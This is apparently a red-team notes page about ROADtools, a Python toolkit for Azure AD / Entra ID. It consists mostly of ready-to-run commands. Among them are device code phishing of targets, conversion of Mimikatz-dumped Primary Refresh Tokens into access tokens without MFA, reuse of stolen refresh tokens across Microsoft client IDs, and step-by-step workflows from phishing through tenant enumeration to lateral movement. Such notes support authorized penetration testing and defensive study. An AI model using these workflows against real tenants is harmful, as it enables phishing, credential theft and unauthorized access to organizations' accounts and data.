# ROADtools

**Tags:** `#roadtools` `#roadrecon` `#roadtx` `#azuread` `#entraid` `#cloud` `#enumeration` `#prt` `#oauth` `#microsoft365`

Python toolkit for Azure AD / Entra ID enumeration and token abuse. Two main components: **roadrecon** (bulk tenant data collection into a SQLite DB with a web UI) and **roadtx** (token manipulation — device code phishing, PRT abuse, OAuth flows). Written by Dirk-jan Mollema — the same author as most of the foundational Azure AD research.

**Source:** https://github.com/dirkjanm/ROADtools
**Install:**
```bash
pip install roadrecon    # roadrecon component
pip install roadtx       # roadtx component
# Or both: pip install roadtools
```

> [!note] **ROADtools vs AADInternals** — ROADtools is Python (runs natively on Kali), AADInternals is PowerShell (needs Windows or pwsh). Use ROADtools from your attack box for recon and token work; use AADInternals when you're already on a Windows host or need PTA/Connect-specific attacks.

> [!note] **See also** — [[Services/Active Directory/Entra ID|Entra ID]] for the broader attack methodology this tool supports (PRT abuse, FOCI token swapping, tenant enumeration).

---

## roadrecon — Tenant Enumeration

roadrecon collects all available Azure AD objects into a local SQLite database, then lets you query or browse them offline.

### Authentication

```bash
# Interactive browser login
roadrecon auth

# Device code (useful when browser not available)
roadrecon auth --device-code

# Username + password (managed tenants only — no MFA)
roadrecon auth -u user@company.com -p 'Password123!'

# Specify tenant ID
roadrecon auth -t <tenant-id>

# Using a refresh token
roadrecon auth --refresh-token <token>

# Using a PRT cookie (stolen from AADJ device)
roadrecon auth --prt-cookie <cookie> --prt-sessionkey <hex-key>
```

### Data Collection

```bash
# Gather everything from the Azure AD Graph — users, groups, roles, devices,
# apps, service principals, CA policies. gather does NOT take per-object flags
# (no --users/--groups); it collects the full set and auto-reads .roadtools_auth.
roadrecon gather
roadrecon gather -d /tmp/tenant.db      # output to a custom SQLite DB

# Companion collectors (separate subcommands, not flags):
roadrecon azgather                      # Azure Resource Manager (subscriptions/resources/RBAC)
roadrecon pimgather                     # PIM eligible role assignments
roadrecon gatherall                     # Graph + MS Graph + more, in one pass
```

### Browse & Query

```bash
# Launch the web UI (browse at http://127.0.0.1:5000) — this is how you view/query data.
# There is NO `roadrecon dump` subcommand; use the GUI or query roadrecon.db directly.
roadrecon gui
roadrecon gui -d /tmp/tenant.db         # specify DB file

# Query the SQLite DB directly for scripted extraction
sqlite3 roadrecon.db "SELECT displayName, userPrincipalName FROM Users;"

# Plugin: generate BloodHound-compatible output
roadrecon plugin bloodhound
# Import output into BloodHound for attack path analysis
```

**What to look for in the web UI:**

| Object | What to Check |
|---|---|
| Users | MFA status, on-prem sync, admin roles assigned |
| Groups | Dynamic vs assigned, privileged group members |
| Roles | Who has Global Admin, Privileged Role Admin, Application Admin |
| Applications | App registrations with long-lived secrets or over-permissive Graph API scopes |
| Service Principals | High-privilege SP creds, managed identity assignments |
| Devices | Azure AD joined vs registered, compliant status |
| CA Policies | Gaps — what's excluded, which users/apps/locations are not covered |

---

## roadtx — Token Manipulation

roadtx handles OAuth flows, PRT abuse, device code phishing, and token refresh/conversion.

### Get Tokens

> [!note] roadtx has **40+ auth subcommands** — run `roadtx -h` for the full list. Interactive and device-code auth are their **own subcommands** (`interactiveauth`), while `gettokens` handles refresh-token / resource / client-switch work.

```bash
# Interactive (Selenium browser) and device-code phishing — the interactiveauth subcommand
roadtx interactiveauth -t <tenant-id> -u user@company.com -p 'Password123!'
roadtx interactiveauth -t <tenant-id> --device-code
# Device code: give the target "microsoft.com/devicelogin + code"; roadtx polls & saves the token

# Request a token for a specific resource/scope (-r/--resource, -s/--scope)
roadtx gettokens -r https://graph.microsoft.com
roadtx gettokens -s https://outlook.office.com/.default     # Exchange
roadtx gettokens -s https://management.azure.com/.default   # Azure ARM

# Refresh an existing token into a new one
roadtx gettokens --refresh-token <token> -r https://graph.microsoft.com
```

### PRT Abuse

PRTs are long-lived tokens on Azure AD-joined devices. Steal with Mimikatz (`sekurlsa::cloudap`), then use roadtx to convert to access tokens — no MFA required.

```bash
# Convert a stolen PRT (+ session key) into access tokens — this is `prtauth`, NOT gettokens
roadtx prtauth \
  --prt <base64-prt> \
  --prt-sessionkey <hex-session-key> \
  -r https://graph.microsoft.com -t <tenant-id>

# Tokens for a specific resource using the PRT
roadtx prtauth \
  --prt <base64-prt> \
  --prt-sessionkey <hex-session-key> \
  -s https://management.azure.com/.default

# Browser SSO from a PRT cookie (ride the session in a real browser)
roadtx browserprtauth --prt-cookie <x-ms-RefreshTokenCredential>
#   generate the cookie itself with `roadtx prtcookie`; request a fresh PRT with `roadtx prt`

# Decrypt a PRT/response blob — the subcommand is `decrypt` (there is no decrypt-prt)
roadtx decrypt -f <prt-file> --prt-sessionkey <hex-key>
```

### Refresh Token Abuse

```bash
# Use a stolen refresh token to get a new access token
roadtx gettokens --refresh-token <rt> --scope https://graph.microsoft.com/.default

# Enumerate what scopes a refresh token is valid for
roadtx gettokens --refresh-token <rt> --scope https://management.azure.com/.default
roadtx gettokens --refresh-token <rt> --scope https://outlook.office.com/.default

# FOCI (Family of Client IDs) — some refresh tokens work across multiple apps
# Try different client IDs with the same refresh token
roadtx gettokens --refresh-token <rt> \
  --client 04b07795-8ddb-461a-bbee-02f9e1bf7b46 \   # Azure CLI
  --scope https://graph.microsoft.com/.default
```

### Inspect Tokens

```bash
# Decode and display a JWT token
roadtx describe --token <access-token>
# Shows: UPN, tenant, roles, scopes, expiry, audience, client app

# Or decode manually
echo "<token>" | python3 -c "
import sys, base64, json
t = sys.stdin.read().strip().split('.')
p = t[1] + '=' * (4 - len(t[1]) % 4)
print(json.dumps(json.loads(base64.urlsafe_b64decode(p)), indent=2))
"
```

---

## Common Attack Workflows

### External Recon → Device Code Phish → Full Enum

```bash
# 1. Recon tenant without auth
curl -s "https://login.microsoftonline.com/<domain>/.well-known/openid-configuration" | jq '.issuer'
curl -s "https://login.microsoftonline.com/common/userrealm/?user=test@<domain>&api-version=1.0" | jq '{type:.NameSpaceType}'

# 2. Start device code phish
roadtx interactiveauth --device-code -r https://graph.microsoft.com
# Send the user_code to target via phishing

# 3. When token received, gather all tenant data (auto-reads .roadtools_auth)
roadrecon gather

# 4. Browse data
roadrecon gui
```

### PRT Theft → Token → Lateral Movement

```bash
# On compromised AADJ Windows box — dump PRT with Mimikatz
# privilege::debug
# sekurlsa::cloudap

# Convert PRT to Graph token (Kali)
roadtx prtauth --prt <prt> --prt-sessionkey <key> \
  -r https://graph.microsoft.com

# Use token to enumerate (gather auto-reads .roadtools_auth)
roadrecon gather

# Convert PRT to Azure ARM token (pivot to Azure resources)
roadtx prtauth --prt <prt> --prt-sessionkey <key> \
  -s https://management.azure.com/.default
```

---

## Key Files

| File | Contents |
|---|---|
| `.roadtools_auth` | Saved tokens (JSON) — default output of `roadrecon auth` |
| `roadrecon.db` | SQLite database from `roadrecon gather` |
| `bh-output/` | BloodHound JSON files from `roadrecon plugin bloodhound` |

---

> [!note] **Related tooling** — the PowerShell counterpart is [[Tools/Cloud/AADInternals|AADInternals]] (PTA/AD-Connect attacks it doesn't cover); FOCI/refresh-token swapping overlaps [[Tools/Cloud/TokenTactics|TokenTactics]]; feed `roadrecon plugin bloodhound` output into [[Tools/AD/BloodHound|BloodHound]].

---

*Created: 2026-03-06*
*Updated: 2026-08-27*
*Model: claude-opus-5*
